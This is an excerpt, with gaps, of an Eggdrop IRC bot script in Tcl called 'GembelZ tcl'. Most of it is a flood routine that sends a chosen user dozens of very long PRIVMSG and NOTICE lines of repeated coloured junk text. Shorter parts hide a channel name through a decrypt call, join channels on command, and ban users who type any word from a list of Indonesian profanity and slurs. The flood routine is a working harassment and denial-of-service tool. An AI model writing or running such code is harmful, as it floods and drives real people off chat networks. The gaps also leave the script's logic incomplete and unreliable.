puthelp "PRIVMSG $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "NOTICE $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "PRIVMSG $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
...
if {$rest==""} {
puthelp "NOTICE $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "PRIVMSG $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "NOTICE $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "PRIVMSG $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "NOTICE $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "PRIVMSG $person :Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
...
if {[string tolower $chan]==[string tolower $basechan] || [string tolower $chan] == [decrypt 64 "1sTFC1W.UYI/"]} {
return 0
}
if {$rest!=""} {
puthelp "JOIN $chan"
...
set badwords {
"tahede" "tel3" "tah3d3" "tahed3" "ngango" "polombuo" "huangango" "hede" "anjrit" "homo" "ho?mo" "lolo" "anjing" "hutv" "polobom" "babi" "puki" "pendo" "luji" "kodo" "tele" "hule" "edehat" "hutu" "cuki" "zinah" "binatangi" "loco" "odok" "kod0" "iblis" "fuck" "lonte" "tambio" "pelacur" "pendo" "toto" "hulelilo" "sex" "pemai" "tah3d3" "hede" "odok" "ta?he" "te?l3" "ta?h3?" "nga?ngo" "po?lomb" "hua?nga" "he?de" "anjrit" "lo?lo" "an?jing" "hu?tv" "ba?bi" "pu?ki" "pen?do" "lu?ji" "ko?do" "te?le" "hu?le" "ede?hat" "hu?tu" "cu?ki" "lo?co" "ko?d0" "fuck" "lon?te" "pen?do" "to?to" "hu?le?lilo" "s3x" "p3mai" "tae?de"
}
set allprotect_chans "*"
set badwordmsg "4iHk waw..!! 3plis jaga typing aaa, n dont say any 4badword on this chan!!! 3u're banned!!"

bind pubm - * pubm_badword
bind pub - * pubm_badword
bind msg - * pubm_badword
bind dcc - * pubm_badword
bind notc - * pubm_badword

proc pubm_badword {nick host hand chan arg} {
 global badwords badword_msg allprotect_chans botnick badwordmsg
...
putlog "==============================="
putlog "     GembelZ tcl loaded        "
putlog " Email: DurjanA@gembelz.do.am  "
putlog "==============================="